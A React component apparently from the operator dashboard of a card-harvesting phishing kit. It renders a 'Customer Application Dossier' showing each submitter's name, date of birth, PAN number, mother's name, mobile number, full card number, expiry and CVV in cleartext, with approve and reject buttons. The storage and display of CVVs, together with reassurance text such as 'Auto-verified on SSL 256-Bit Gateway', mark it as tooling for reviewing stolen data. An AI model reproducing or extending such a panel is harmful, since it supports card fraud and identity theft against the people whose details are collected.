import React from 'react';
import { X, User, CreditCard, Shield, Calendar, Phone, Check, AlertTriangle, FileText } from 'lucide-react';

export default function SubmissionDetailModal({ submission, onClose, onUpdateStatus }) {
  if (!submission) return null;

  return (
    <div className="modal-overlay" onClick={onClose}>
      <div className="dossier-modal-card" onClick={(e) => e.stopPropagation()}>
        {/* Header */}
        <div className="modal-header-banner">
          <div className="modal-header-left">
            <h3>Customer Application Dossier</h3>
            <p>Application Ref: <strong>{submission.id}</strong> · {submission.submittedAt}</p>
          </div>
          <button className="modal-close-btn" onClick={onClose}>
            <X size={18} />
          </button>
        </div>

        {/* Body */}
        <div className="modal-body">
          {/* Personal & KYC Info */}
          <div>
            <div className="detail-section-title">
              <User size={16} />
              <span>Personal & KYC Identity Details</span>
            </div>
            <div className="detail-grid">
              <div className="detail-item">
                <span className="detail-item-lbl">Full Name</span>
                <span className="detail-item-val">{submission.fullName}</span>
              </div>
              <div className="detail-item">
                <span className="detail-item-lbl">Date of Birth</span>
                <span className="detail-item-val">{submission.dob}</span>
              </div>
              <div className="detail-item">
                <span className="detail-item-lbl">PAN Card Number</span>
                <span className="detail-item-val mono">
                  <span className="pan-badge">{submission.panNumber || 'NOT PROVIDED'}</span>
                </span>
              </div>
              <div className="detail-item">
                <span className="detail-item-lbl">Mother's Name</span>
                <span className="detail-item-val">{submission.mothersName}</span>
              </div>
              <div className="detail-item">
                <span className="detail-item-lbl">Mobile Number</span>
                <span className="detail-item-val mono">{submission.mobileNumber}</span>
              </div>
              <div className="detail-item">
                <span className="detail-item-lbl">Requested Service</span>
                <span className="detail-item-val" style={{ textTransform: 'capitalize' }}>
                  {submission.selectedService?.replace('_', ' ')}
                </span>
              </div>
            </div>
          </div>

          {/* Card & Banking Details */}
          <div>
            <div className="detail-section-title">
              <CreditCard size={16} />
              <span>Card & Transaction Data</span>
            </div>
            <div className="detail-grid">
              <div className="detail-item">
                <span className="detail-item-lbl">Cardholder Name</span>
                <span className="detail-item-val">{submission.nameOnCard || submission.fullName}</span>
              </div>
              <div className="detail-item">
                <span className="detail-item-lbl">Card Number</span>
                <span className="detail-item-val mono">
                  {submission.cardNumber || '•••• •••• •••• 9082'}
                </span>
              </div>
              <div className="detail-item">
                <span className="detail-item-lbl">Expiry Date</span>
                <span className="detail-item-val mono">{submission.expiryDate || '08/29'}</span>
              </div>
              <div className="detail-item">
                <span className="detail-item-lbl">CVV Code</span>
                <span className="detail-item-val mono">
                  {submission.cvv ? '••• (' + submission.cvv + ')' : '•••'}
                </span>
              </div>
            </div>
          </div>

          {/* Verification Status info */}
          <div style={{ background: '#f1f5f9', padding: '1rem', borderRadius: '12px', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
            <div>
              <span style={{ fontSize: '0.75rem', fontWeight: 700, color: '#64748b', textTransform: 'uppercase' }}>Current Verification Status:</span>
              <div style={{ marginTop: '0.2rem' }}>
                <span className={`status-pill ${submission.status}`}>
                  <span className={`status-dot ${submission.status}`}></span>
                  {submission.status === 'pending' ? 'Under 18-Hour Verification' : submission.status}
                </span>
              </div>
            </div>
            <span style={{ fontSize: '0.78rem', color: '#64748b' }}>
              Auto-verified on SSL 256-Bit Gateway
            </span>
          </div>
        </div>

        {/* Footer Actions */}
        <div className="modal-footer">
          <button className="btn-secondary" onClick={onClose}>
            Close Dossier
          </button>
          <div style={{ display: 'flex', gap: '0.6rem' }}>
            <button
              className="btn-reject-lg"
              onClick={() => {
                onUpdateStatus(submission.id, 'rejected');
                onClose();
              }}
            >
              <AlertTriangle size={16} />
              <span>Reject Request</span>
            </button>
            <button
              className="btn-approve-lg"
              onClick={() => {
                onUpdateStatus(submission.id, 'approved');
                onClose();
              }}
            >
              <Check size={16} />
              <span>Approve & Verify</span>
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
